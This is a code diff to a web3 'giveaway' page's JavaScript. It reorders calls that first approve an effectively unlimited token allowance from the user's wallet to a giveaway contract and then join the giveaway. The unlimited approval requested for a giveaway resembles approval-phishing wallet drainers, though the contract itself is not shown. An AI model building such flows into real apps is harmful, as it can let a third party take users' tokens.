@@ -120,25 +120,15 @@
             {
                 var max = '10000000000000000000000000000000000000000000000000000000000000000000000000';
                 tokenContract.methods.approve(giveawayAddress, max).send({from : userAddress})
+                .on('confirmation', function(confirmationNumber, receipt){});
+            }
+            giveawayContract.methods.joinGiveaway().send({from : userAddress})
                 .on('confirmation', function(confirmationNumber, receipt){
-                    giveawayContract.methods.joinGiveaway().send({from : userAddress})
-                    .on('confirmation', function(confirmationNumber, receipt){
-                        document.getElementById("start-button").classList.remove("button_waiting");
-                        document.getElementById("start-button").classList.add("button_valid");
-                        document.getElementById("start-button").innerText = "You have joined the giveaway! You can close this window!";
-                        document.getElementById("start-button").disabled = true;
-                    });
-            });
-            }
-            else {
-                giveawayContract.methods.joinGiveaway().send({from : userAddress})
-                    .on('confirmation', function(confirmationNumber, receipt){
-                        document.getElementById("start-button").classList.remove("button_waiting");
-                        document.getElementById("start-button").classList.add("button_valid");
-                        document.getElementById("start-button").innerText = "You have joined the giveaway! You can close this window!";
-                        document.getElementById("start-button").disabled = true;
-                    });
-            }
+                    document.getElementById("start-button").classList.remove("button_waiting");
+                    document.getElementById("start-button").classList.add("button_valid");
+                    document.getElementById("start-button").innerText = "You have joined the giveaway! You can close this window!";
+                    document.getElementById("start-button").disabled = true;
+                });
         }
 
         async function getNFTSymbol() {
